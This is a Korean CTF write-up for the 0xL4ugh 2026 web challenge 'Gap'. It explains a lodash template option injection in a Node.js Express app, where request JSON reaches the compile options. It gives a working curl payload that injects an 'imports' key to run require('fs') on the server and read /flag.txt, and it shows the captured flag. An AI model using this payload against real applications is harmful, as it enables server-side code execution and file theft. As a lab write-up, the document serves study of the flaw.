---
title: "[CTF/Writeups] 2026_0xL4ugh_web_gap"
excerpt: "2026 0xL4ughCTF web_Gap writeups"

categories: # 카테고리 설정
  - ctf
  - web
tags: # 포스트 태그
  - [CTF, writeups, 0xL4ughctf]

permalink: /ctf/web/0xL4ugh_2026_web_Gap/ # 포스트 URL

toc: false # 우측에 본문 목차 네비게이션 생성
toc_sticky: false # 본문 목차 네비게이션 고정 여부

date: 2026-02-05 # 작성 날짜
last_modified_at: 2026-02-05 # 최종 수정 날짜
---


# Gap Write-up

## 1) 문제 설명
- 스택: Node.js + Express + consolidate(lodash)
- `/render`가 요청 JSON(`req.body`)을 그대로 템플릿 렌더링에 전달한다.
- 템플릿은 고정: `<%= input %>` (입력값 출력)
- 플래그는 컨테이너 내부 `/flag.txt`
- 취약점: **Template Option Injection**
  - `req.body`가 **템플릿 데이터(locals)** 뿐 아니라 **lodash 템플릿 컴파일 옵션(options)** 으로도 사용되는 “gap”이 존재

## 2) 재현 절차 (PoC)
### (1) 정상 출력 확인
```bash
curl -s -X POST "http://challenges4.ctf.sd:34454/render" \\
  -H "Content-Type: application/json" \\
  --data-binary '{"input":"hello"}'
```

### (2) Exploit: imports 옵션 주입으로 /flag.txt 읽기
```bash
curl -s -X POST "http://challenges4.ctf.sd:34454/render" \
  -H "Content-Type: application/json" \
  --data-binary '{"imports":{"a,b,input=global.process.mainModule.require(\"fs\").readFileSync(\"/flag.txt\",\"utf8\")":1}}'
```

## 3) 결론 (원리)
- lodash 템플릿은 내부적으로 템플릿을 `Function(...)`으로 컴파일한다.
- `imports` 옵션의 key들이 컴파일된 함수의 **파라미터 선언부**에 들어간다.
- 아래처럼 `input`을 default parameter로 강제 설정하면:
  - `input`을 별도로 넘기지 않아도 `/flag.txt`가 읽혀서 `input`에 들어감
  - 고정 템플릿 `<%= input %>`이 그 값을 그대로 출력함

개념상 생성되는 형태:
```js
function(a, b, input = fs.readFileSync("/flag.txt","utf8")) {
  // template: <%= input %>
}
```

✅ Flag: `0xL4ugh{L0d4sh_G0t_N0_Ch1ll_f976a9976eb47af4}`

